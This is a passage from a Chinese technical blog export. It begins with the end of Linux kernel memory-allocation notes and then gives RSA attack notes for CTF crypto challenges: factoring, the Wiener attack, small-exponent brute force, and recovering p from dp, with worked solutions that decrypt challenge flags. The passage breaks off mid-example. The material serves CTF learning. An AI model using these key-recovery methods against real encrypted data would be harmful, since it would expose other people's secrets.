<td>只分配一页，让其内容填充0，返回指向其逻辑地址的指针</td>
</tr>
</tbody>
</table>
</div>
<p>可以通过<code>void free_pages(unsigned long addr, unsigned int order)</code>等方法释放页，谨慎使用，如果传递错误addr或者order会导致系统崩溃。  </p>
<h3 id="12-4-gfp-mask-标志"><a href="#12-4-gfp-mask-标志" class="headerlink" title="12.4 gfp_mask 标志"></a>12.4 gfp_mask 标志</h3><p>均在 <code>&lt;linux/gfp.h&gt;</code> 中声明</p>
<ol>
<li>行为修饰符：指定分配器行为  </li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th>标志</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>__GFP_WAIT</td>
<td>分配器可以睡眠</td>
</tr>
<tr>
<td>__GFP_HIGH</td>
<td>分配器可以访问紧急事件缓冲池</td>
</tr>
<tr>
<td>__GFP_IO</td>
<td>分配器可以启动磁盘I/O</td>
</tr>
<tr>
<td>__GFP_FS</td>
<td>分配器可以启动文件系统I/O</td>
</tr>
<tr>
<td>__GFP_COLD</td>
<td>分配器应该使用高速缓存中快要淘汰出去的页</td>
</tr>
<tr>
<td>__GFP_NOWARN</td>
<td>分配器将不打印失败警告</td>
</tr>
<tr>
<td>__GFP_REPEAT</td>
<td>分配器在分配失败时重复进行分配，但是这次分配还存在失败的可能</td>
</tr>
<tr>
<td>__GFP_NOFALL</td>
<td>分配器将无限的重复进行分配。分配不能失败</td>
</tr>
<tr>
<td>__GFP_NORETRY</td>
<td>分配器在分配失败时不会重新分配</td>
</tr>
<tr>
<td>__GFP_NO_GROW</td>
<td>由 slab 层内部使用</td>
</tr>
<tr>
<td>__GFP_COMP</td>
<td>添加混合页元数据，在 hugetlb 的代码内部使用</td>
</tr>
</tbody>
</table>
</div>
<ol>
<li>区修饰符：指定内存分配在哪个区  </li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th>标志</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>__GFP_DMA</td>
<td>从 ZONE_DMA 分配</td>
</tr>
<tr>
<td>__GFP_DMA32</td>
<td>只在 ZONE_DMA32 分配</td>
</tr>
<tr>
<td>__GFP_HIGHMEM</td>
<td>从 ZONE_HIGHMEM（优先） 或者 ZONE_NORMAL 分配</td>
</tr>
</tbody>
</table>
</div>
<ol>
<li>类型标志：指定行为和区描述符  </li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th>标志</th>
<th>关联的修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>GFP_ATOMIC</td>
<td>__GFP_HIGH</td>
<td>这个标志用在中断处理程序、下半部、持有自旋锁以及其他<strong>不能睡眠</strong>的地方</td>
</tr>
<tr>
<td>GFP_NOWAIT</td>
<td>0</td>
<td>与 GFP_ATOMIC 类似，不同之处在于，调用不会退给紧急内存池。 这就增加了内存分配失败的可能性。</td>
</tr>
<tr>
<td>GFP_NOIO</td>
<td>__GFP_WAIT</td>
<td>这种分配可以阻塞，但不会启动磁盘I/O。 这个标志在不能引发更多磁盘I/O时能阻塞I/O代码，可能导致递归</td>
</tr>
<tr>
<td>GFP_NOFS</td>
<td><code>__GFP_WAIT或__GFP_IO</code></td>
<td>这种分配在必要时可能阻塞，也可能启动磁盘I/O，但不会启动文件系统操作。 这个标志在你不能再启动另一个文件系统的操作时，用在文件系统部分的代码中</td>
</tr>
<tr>
<td>GFP_KERNEL</td>
<td><code>(__GFP_WAIT ｜ __GFP_IO ｜ __GFP_FS )</code></td>
<td>这是常规的分配方式，可能会阻塞。这个标志在睡眠安全时用在进程上下文代码中。 为了获得调用者所需的内存，内核会尽力而为。这个标志应当是首选标志</td>
</tr>
<tr>
<td>GFP_USER</td>
<td><code>(__GFP_WAIT ｜ __GFP_IO ｜ __GFP_FS )</code></td>
<td>这是常规的分配方式，可能会阻塞。这个标志用于为用户空间进程分配内存时</td>
</tr>
<tr>
<td>GFP_HIGHUSER</td>
<td><code>(__GFP_WAIT ｜ __GFP_IO ｜ __GFP_FS )｜__GFP_HIGHMEM)</code></td>
<td>从 ZONE_HIGHMEM 进行分配，可能会阻塞。用于为用户空间进程分配内存</td>
</tr>
<tr>
<td>GFP_DMA</td>
<td>__GFP_DMA</td>
<td>从 ZONE_DMA 进行分配。需要获取能供 DMA 使用的内存的设备驱动程序使用这个标志。通常与以上的某个标志组合在一起使用。</td>
</tr>
</tbody>
</table>
</div>
<h4 id="12-4-1-什么时候用什么标志？"><a href="#12-4-1-什么时候用什么标志？" class="headerlink" title="12.4.1 什么时候用什么标志？"></a>12.4.1 什么时候用什么标志？</h4><div class="table-container">
<table>
<thead>
<tr>
<th>情形</th>
<th>标志</th>
</tr>
</thead>
<tbody>
<tr>
<td>进程上下文，可以睡眠</td>
<td>使用 GFP_KERNEL</td>
</tr>
<tr>
<td>进程上下文，不可以睡眠</td>
<td>使用 GFP_ATOMIC，在睡眠之前或之后以 GFP_KERNEL 执行内存分配</td>
</tr>
<tr>
<td>中断处理程序/软中断/tasklet</td>
<td>使用 GFP_ATOMIC</td>
</tr>
<tr>
<td>需要用于DMA的内存，可以睡眠</td>
<td>使用 (GFP_DMA｜GFP_KERNEL)</td>
</tr>
<tr>
<td>需要用于DMA的内存，不可以睡眠</td>
<td>使用 (GFP_DMA｜GFP_ATOMIC)，或者在睡眠之前执行内存分配</td>
</tr>
</tbody>
</table>
</div>
<h3 id="12-5-malloc、kmalloc、vmalloc-区别"><a href="#12-5-malloc、kmalloc、vmalloc-区别" class="headerlink" title="12.5 malloc、kmalloc、vmalloc 区别"></a>12.5 malloc、kmalloc、vmalloc 区别</h3><ol>
<li>malloc 返回的页在进程的虚拟地址空间是连续的，但物理空间不一定是连续的  </li>
<li>kmalloc 确保物理地址也是连续的（虚拟地址自然也是连续的）  </li>
<li>vmalloc 只确保页在虚拟地址空间是连续的</li>
</ol>
<p>出于性能考虑，很多内核代码使用 kmalloc 获取内存。因为 <font color="blue">vmalloc</font> 为了把物理地址空间不连续的页转换为虚拟地址空间连续的页，会专门建立页表项，并一个一个进行映射，这会导致比直接内存映射有更大的 <font color="blue">TLB 抖动</font>。  </p>
<h3 id="12-6-slab-层"><a href="#12-6-slab-层" class="headerlink" title="12.6 slab 层"></a>12.6 slab 层</h3><hr>
<h4 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h4><p>TLB（Translation lookaside buffer）是一种硬件缓冲区，用于缓存虚拟地址到物理地址的映射关系，可以极大提高系统性能。</p>
<hr>
<h2 id="第-13-章-虚拟文件系统"><a href="#第-13-章-虚拟文件系统" class="headerlink" title="第 13 章 - 虚拟文件系统"></a>第 13 章 - 虚拟文件系统</h2><h2 id="第-14-章-块-I-O-层"><a href="#第-14-章-块-I-O-层" class="headerlink" title="第 14 章 - 块 I/O 层"></a>第 14 章 - 块 I/O 层</h2><h2 id="第-15-章-进程地址空间"><a href="#第-15-章-进程地址空间" class="headerlink" title="第 15 章 - 进程地址空间"></a>第 15 章 - 进程地址空间</h2><h2 id="第-16-章-页高速缓存和页回写"><a href="#第-16-章-页高速缓存和页回写" class="headerlink" title="第 16 章 - 页高速缓存和页回写"></a>第 16 章 - 页高速缓存和页回写</h2><h2 id="第-17-章-设备与模块"><a href="#第-17-章-设备与模块" class="headerlink" title="第 17 章 - 设备与模块"></a>第 17 章 - 设备与模块</h2><h2 id="第-18-章-调试"><a href="#第-18-章-调试" class="headerlink" title="第 18 章 - 调试"></a>第 18 章 - 调试</h2><h2 id="第-19-章-可移植性"><a href="#第-19-章-可移植性" class="headerlink" title="第 19 章 - 可移植性"></a>第 19 章 - 可移植性</h2><h2 id="第-20-章-补丁、开发和社区"><a href="#第-20-章-补丁、开发和社区" class="headerlink" title="第 20 章 - 补丁、开发和社区"></a>第 20 章 - 补丁、开发和社区</h2>]]></content>
      <categories>
        <category>内核</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA知识点总结</title>
    <url>/2020/07/29/RSA%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="大数分解"><a href="#大数分解" class="headerlink" title="大数分解"></a>大数分解</h2><h3 id="大数分解网页"><a href="#大数分解网页" class="headerlink" title="大数分解网页"></a>大数分解网页</h3><p><a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a></p>
<h3 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h3><ol>
<li>运行yafu-x64.exe，在窗口中输入factor(n)，n即为待分解的大数。  </li>
<li>在factor.log中找到分解结果。</li>
</ol>
<h2 id="利用z3解方程"><a href="#利用z3解方程" class="headerlink" title="利用z3解方程"></a>利用z3解方程</h2><p>可以加快解题速度，此处以一个简单的例子展示如何用z3解方程（首先需要安装z3和z3-solver）。<br>$\begin{cases}\ x1+x2=3\\ x1-x2=-1\end{cases}$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x1 = Int(<span class="string">&#x27;x1&#x27;</span>)</span><br><span class="line">x2 = Int(<span class="string">&#x27;x2&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x1 + x2 == <span class="number">3</span>)</span><br><span class="line">s.add(x1 - x2 == -<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<p>如例题[GWCTF 2019]BabyRSA</p>
<h2 id="已知p-q-e求d"><a href="#已知p-q-e求d" class="headerlink" title="已知p,q,e求d"></a>已知p,q,e求d</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">n = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedEuclid</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y= extendedEuclid(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y</span><br><span class="line">d = extendedEuclid(e,n)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
<h3 id="方法二-常用，gmpy2库-："><a href="#方法二-常用，gmpy2库-：" class="headerlink" title="方法二(常用，gmpy2库)："></a>方法二(常用，gmpy2库)：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已知e,p,q</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">phin = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phin)</span><br></pre></td></tr></table></figure>
<h3 id="方法三-sage-："><a href="#方法三-sage-：" class="headerlink" title="方法三(sage)："></a>方法三(sage)：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phin = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,phin)</span><br></pre></td></tr></table></figure>
<h2 id="已知n-dp-e求d"><a href="#已知n-dp-e求d" class="headerlink" title="已知n,dp,e求d"></a>已知n,dp,e求d</h2><p>相关例题如：<a href="#Buuoj_RSA2">Buuoj RSA2</a>  </p>
<ol>
<li>要先根据e,dp求p。首先<br>&emsp;&emsp;$dp\ =\ d\ mod\ (p-1)$<br>&emsp;&emsp;$ed\ \equiv\ 1\ mod\ \phi(n)$<br>而$\phi(n)\ =\ (p-1)(q-1)$，所以有<br>&emsp;&emsp;$ed\ =\ 1+x(p-1)(q-1)$<br>&emsp;&emsp;$edp\ mod\ (p-1)\ \equiv\ ed\ mod\ (p-1)$<br>进而：<br>&emsp;&emsp;$edp\ =\ ed+y(p-1)$<br>&emsp;&emsp;$edp\ =\ 1+x(p-1)(q-1)+y(p-1)$<br>因此可整理为：<br>&emsp;&emsp;$edp\ =\ 1+y(p-1)$<br>又有$dp\ \lt\ p-1$，所以$e\ \gt\ y$。从1到e遍历即可求得正确的y，进而得到正确的p值。得到p后可有已知的n求得q，进而回到已知$e$和$\phi(n)$求解$d$的问题。得到代码如下，注意求p时是整型除法，否则会在n%p时报溢出错误：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    <span class="keyword">if</span> (e*dp - <span class="number">1</span>)%y == <span class="number">0</span>:</span><br><span class="line">        p = (e*dp - <span class="number">1</span>)//y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="小指数明文爆破"><a href="#小指数明文爆破" class="headerlink" title="小指数明文爆破"></a>小指数明文爆破</h2><p>相关例题，<a href="#Dangerous_RSA">Buuoj Dangerous RSA</a>  </p>
<ol>
<li>题目已知条件有n,e,c其中e是非常小的值，比如3。RSA的加密过程为$c=m^e\ mod\ n$。<br>如果m很小，n很大，也即可能是以下情况$^{[2]}$：<br>&emsp;&emsp;$m^e\ \lt\ n$<br>此时，$c=m^e$，开e次根即可得到m。<br>如果，$m^e \gt\ n$但是并未超过n太多，又由于对c我们可能有$m^e=c+kn$，所以可以得到以下的表达式：<br>&emsp;&emsp;$m=\sqrt[e]{c+kn}$<br>这样我们可以通过爆破k的大小来求解明文了。  </li>
<li>基本代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已知n,e,c</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+k*n,e)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c+k*n,e)[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><code>iroot(c+k*n,e)</code>函数就是在计算$\sqrt[e]{c+kn}$，其返回结果第一个元素为计算结果，第二个元素是表示结果是否精确的布尔值  </p>
<h2 id="分数，求导"><a href="#分数，求导" class="headerlink" title="分数，求导"></a>分数，求导</h2><p>相关例题：[BJDCTF2020]easyrsa</p>
<h3 id="分数"><a href="#分数" class="headerlink" title="分数"></a>分数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fraction(8, 6) will produce a rational number equivalent to 4/3, Both arguments must be Rational. The numerator defaults to 0 and the denominator defaults to 1 so that Fraction(3) == 3 and Fraction() == 0.</span></span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line">x = Fraction(<span class="number">8</span>,<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<h3 id="求导"><a href="#求导" class="headerlink" title="求导"></a>求导</h3><p><a href="http://liao.cpython.org/scipy17/">http://liao.cpython.org/scipy17/</a><br>如对$arctan(p)$求导（p为变量）  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Derivative</span><br><span class="line">x = Derivative(arctan(p),p)</span><br></pre></td></tr></table></figure>
<h2 id="已知e-n且e很大时求d-RSA-Wiener-Attack-维纳攻击"><a href="#已知e-n且e很大时求d-RSA-Wiener-Attack-维纳攻击" class="headerlink" title="已知e,n且e很大时求d: RSA Wiener Attack 维纳攻击"></a>已知e,n且e很大时求d: RSA Wiener Attack 维纳攻击</h2><p>参考：<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a><br>求d的方法：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> RSAwienerHacker <span class="keyword">import</span> hack_RSA</span><br><span class="line">d = hack_RSA(e,n)</span><br></pre></td></tr></table></figure>
<p>相关例题Buuoj rsa2</p>
<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><ol>
<li>首先需要下载安装openssl，<a href="https://slproweb.com/products/Win32OpenSSL.html">下载地址</a>  </li>
<li>将其bin目录添加到系统变量path中  </li>
<li>基本用法参考<a href="https://www.cnblogs.com/wyzhou/p/9738964.html">https://www.cnblogs.com/wyzhou/p/9738964.html</a>  </li>
<li>如利用openssl从文件获取公钥信息（不输出文件）：<code>openssl rsa -pubin -in key.pub -text -noout</code></li>
</ol>
<h2 id="利用Crypto-PublicKey的RSA模块从文件中获取公钥信息n-e"><a href="#利用Crypto-PublicKey的RSA模块从文件中获取公钥信息n-e" class="headerlink" title="利用Crypto.PublicKey的RSA模块从文件中获取公钥信息n,e"></a>利用Crypto.PublicKey的RSA模块从文件中获取公钥信息n,e</h2><p>这个文件可能是二进制文件，key.pub，pub.key等形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;key.pub&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">pub = RSA.importKey(f)</span><br><span class="line"><span class="built_in">print</span>(pub.n,pub.e)</span><br></pre></td></tr></table></figure>
<p>相关例题：Buuoj RSA, <a href="https://www.cnblogs.com/vict0r/p/13445509.html">攻防世界 cr4-poor-rsa</a></p>
<h2 id="已知e-d的值和p-q的位数，求p-q的值"><a href="#已知e-d的值和p-q的位数，求p-q的值" class="headerlink" title="已知e,d的值和p,q的位数，求p,q的值"></a>已知e,d的值和p,q的位数，求p,q的值</h2><p>先验知识：<br>&emsp;&emsp;$n=pq$<br>&emsp;&emsp;$\phi(n)=(p-1)(q-1)$<br>&emsp;&emsp;$ed\equiv1\ mod\ \phi(n)$<br>所以，大概有</p>
<script type="math/tex; mode=display">
ed-1=x*\phi(n)</script><p>如果我们已知p,q的位数，那就大概知道n的位数，$\phi(n)$的位数与n差别不大。同时$ed-1$的位数可以通过其值得到范围，因此我们可以通过$\frac{(ed-1)的位数}{\phi(n)的位数}$大致确定x的位数，随即可以在此范围遍历得到素数p,q的值。<br>相关例题：[NCTF2019]babyRSA  </p>
<h2 id="已知多组n-c的值"><a href="#已知多组n-c的值" class="headerlink" title="已知多组n,c的值"></a>已知多组n,c的值</h2><h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p><a href="https://blog.csdn.net/qq_39642801/article/details/104158699?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-4">参考代码</a>  </p>
<h3 id="遍历n，看有无非1的公因数，其值即为p或q的值"><a href="#遍历n，看有无非1的公因数，其值即为p或q的值" class="headerlink" title="遍历n，看有无非1的公因数，其值即为p或q的值"></a>遍历n，看有无非1的公因数，其值即为p或q的值</h3><h2 id="RsaCtfTool"><a href="#RsaCtfTool" class="headerlink" title="RsaCtfTool"></a>RsaCtfTool</h2><p><a href="https://github.com/Ganapati/RsaCtfTool">源代码</a>  </p>
<ol>
<li><a href="https://www.cnblogs.com/jiugao/p/11528771.html">安装</a>过程中注意mpfr和mpc都应从官网确认最新版本后再下载对应版本并安装。  </li>
<li>使用方法：</li>
</ol>
<h2 id="已知n的值，且p，q大小相近，如何求出p和q"><a href="#已知n的值，且p，q大小相近，如何求出p和q" class="headerlink" title="已知n的值，且p，q大小相近，如何求出p和q"></a>已知n的值，且p，q大小相近，如何求出p和q</h2><ol>
<li>先对n求平方根，得到一个和p值相近的值，再求其临近的素数，即为p值  </li>
<li>q = n // p  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">near_p = isqrt(n)</span><br><span class="line">p = next_prime(near_p)</span><br><span class="line">q = n // p</span><br></pre></td></tr></table></figure>
<h2 id="已知dp-dq-p-q-c求明文"><a href="#已知dp-dq-p-q-c求明文" class="headerlink" title="已知dp,dq,p,q,c求明文"></a>已知dp,dq,p,q,c求明文</h2><p><a href="https://www.yuque.com/brooke-ygfso/mhpnug/vfy8lw#Zir1b">参考</a>  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">dp, dq, p, q, c</span>):</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    <span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="Buuoj-RSA"><a href="#Buuoj-RSA" class="headerlink" title="Buuoj RSA"></a>Buuoj RSA</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><ol>
<li><p>给了flag.enc和pub.key文件，其中pub.key文件存放了公钥信息，这是个ASCII文本文件可直接用记事本打开。得到以下信息：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">/AvKr1rzQczdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
</li>
<li><p>借助<a href="http://tool.chacuo.net/cryptrsakeyparse">RSA密钥解析网站</a>解析密钥指数和模数信息，得以下结果：  </p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key长度：256</span><br><span class="line">模数：C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</span><br><span class="line">指数：65537</span><br></pre></td></tr></table></figure>
<ol>
<li><p>用Python得到n的十进制形式  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="string">&#x27;0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD&#x27;</span></span><br><span class="line">n = <span class="built_in">int</span>(n,<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>得到n=86934482296048119190666062003494800588905656017203025617216654058378322103517，放到<a href="http://www.factordb.com/index.php">大数分解网站</a>分解。得到：  </p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=285960468890451637935629440372639283459</span><br><span class="line">q=304008741604601924494328155975272418463</span><br></pre></td></tr></table></figure>
<ol>
<li>利用gmpy2库求解d，由以上已得数据有以下代码<code>d = gmpy2.invert(e,(p-1)*(q-1))</code>，得到：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d=81176168860169991027846870170527607562179635470395365333547868786951080991441</span><br></pre></td></tr></table></figure>
<p>注意这个invert函数的用法：<br><code>invert(x, m) Return y such that x*y == 1 (mod m).</code> </p>
<ol>
<li>最后从flag.enc文件中获取flag  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">k = rsa.PrivateKey(n,e,<span class="built_in">int</span>(d),p,q)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb+&quot;</span>).read()</span><br><span class="line">flag = rsa.decrypt(f,k)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;decrypt_256&#125;</code> </p>
<p>或者<a href="https://www.anquanke.com/post/id/217151">参考</a>  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">key_info = RSA.construct((n, e, d, p, q))</span><br><span class="line">key = RSA.importKey(key_info.exportKey())</span><br><span class="line">key = PKCS1_OAEP.new(key)</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">flag = key.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>注意这个rsa.PrivateKey所有的参数都要是int  </p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>主要是获取n,e的方法不同：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;pub.key&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">pub = RSA.importKey(f)</span><br><span class="line"><span class="built_in">print</span>(pub.n,pub.e)</span><br></pre></td></tr></table></figure>
<p>直接输出86934482296048119190666062003494800588905656017203025617216654058378322103517 65537</p>
<h2 id="BJDCTF-2nd-rsa0"><a href="#BJDCTF-2nd-rsa0" class="headerlink" title="BJDCTF 2nd rsa0"></a>BJDCTF 2nd rsa0</h2><ol>
<li>给了node3.buuoj.cn:29594，nc连接，得到<br> <img src="/2020/07/29/RSA%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/1931211-20200729165149511-1880562176.png" alt="1931211-20200729165149511-1880562176"></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 13979291</span><br><span class="line">p+q = 20977237986260593007660890508981067717396093749899360568870922582494976303967087098763078818179895715873024734793751951400162205998115419482795316817920280</span><br><span class="line">p-q = -5049426131779840852071003122042677476051158981429628650820093396659375847153227632945712179794489294190510006561721934678066481600345373791000262601840042</span><br><span class="line">c = 70438117942432148008990442238556447232354085811498412417829189204204737054074566374301936532846141586758014111171803840917548492915882174313587753182928014329241019646660166773180120124742002245739755885008339458315540236586607784113539202894986339079670203214801205209774217343754700849332717174826097340110</span><br></pre></td></tr></table></figure>
<ol>
<li>Python代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p_add_q = <span class="number">20977237986260593007660890508981067717396093749899360568870922582494976303967087098763078818179895715873024734793751951400162205998115419482795316817920280</span></span><br><span class="line">p_sub_q = -<span class="number">5049426131779840852071003122042677476051158981429628650820093396659375847153227632945712179794489294190510006561721934678066481600345373791000262601840042</span></span><br><span class="line">c = <span class="number">70438117942432148008990442238556447232354085811498412417829189204204737054074566374301936532846141586758014111171803840917548492915882174313587753182928014329241019646660166773180120124742002245739755885008339458315540236586607784113539202894986339079670203214801205209774217343754700849332717174826097340110</span></span><br><span class="line">p = (p_add_q + p_sub_q)//<span class="number">2</span></span><br><span class="line">q = (p_add_q - p_sub_q)//<span class="number">2</span></span><br><span class="line">phn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">13979291</span></span><br><span class="line">d = gmpy2.invert(e,phn)</span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="built_in">pow</span>(c,<span class="built_in">int</span>(d),n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;2824f2c0-b958-4d96-9ce7-1b3d40e9333d&#125;</code></p>
<h2 id="BJDCTF-2nd-rsa1"><a href="#BJDCTF-2nd-rsa1" class="headerlink" title="BJDCTF 2nd rsa1"></a>BJDCTF 2nd rsa1</h2><ol>
<li>nc node3.buuoj.cn 28900得到：<br> <img src="/2020/07/29/RSA%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/1931211-20200729173057340-1474699671.png" alt="1931211-20200729173057340-1474699671"></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 10281503</span><br><span class="line">p^2 + q^2 = 270444057910653983291510342788952455699025527244143860021628706211845060535465451636917932321742662851778396880163283934354651585000332834898540722361841525611785115213254272403844678168824876648088734737984008962948002087685706718428981545607421310961607011733185197994774655764395053430025157272336829270370</span><br><span class="line">p - q=-1561498872519047771182262215325701201358158620347512518506157053314655896940102610797598167661629486698972575964893349157597071878670209310740687905237512</span><br><span class="line">c = 